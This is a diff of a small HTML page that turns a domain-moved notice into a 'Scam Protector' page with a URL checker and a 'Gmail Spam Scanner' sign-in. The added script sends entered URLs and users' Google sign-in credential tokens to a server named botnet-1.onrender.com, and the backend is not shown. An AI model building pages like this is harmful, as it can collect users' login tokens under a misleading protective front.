@@ -3,13 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Askit domains</title>
+    <title>Scam Protector</title>
+    <script src="https://accounts.google.com/gsi/client" async defer></script>
 </head>
 <body>
-    <h1>We were made to sell.</h1>
-    <p>We moved, to <a href="http://askit.uk.to">askit.uk.to</a> We are owned by ISSA (INTERNET SITE SIGNING AUTHORITY)</p>
-    <footer>
-        <p>hello, this page was made with github pages.</p>
-    </footer>
+    <h2>Check URL for Scam</h2>
+    <input type="text" id="urlInput" placeholder="Enter URL">
+    <button onclick="checkURL()">Check</button>
+    <p id="result"></p>
+
+    <h2>Gmail Spam Scanner</h2>
+    <div id="g_id_onload"
+         data-client_id="718374962756-qjib3tbrmdsntcfujoc7bea2bmk2onlp.apps.googleusercontent.com"
+         data-callback="handleCredentialResponse">
+    </div>
+    <div class="g_id_signin" data-type="standard"></div>
+
+    <script>
+        function checkURL() {
+            let url = document.getElementById("urlInput").value;
+            fetch('https://botnet-1.onrender.com/check_url', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({url: url})
+            })
+            .then(response => response.json())
+            .then(data => document.getElementById("result").innerText = data.message)
+            .catch(error => console.error('Error:', error));
+        }
+
+        function handleCredentialResponse(response) {
+            fetch('https://botnet-1.onrender.com/authenticate', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({token: response.credential})
+            })
+            .then(response => response.json())
+            .then(data => alert(data.message))
+            .catch(error => console.error('Error:', error));
+        }
+    </script>
 </body>
 </html>
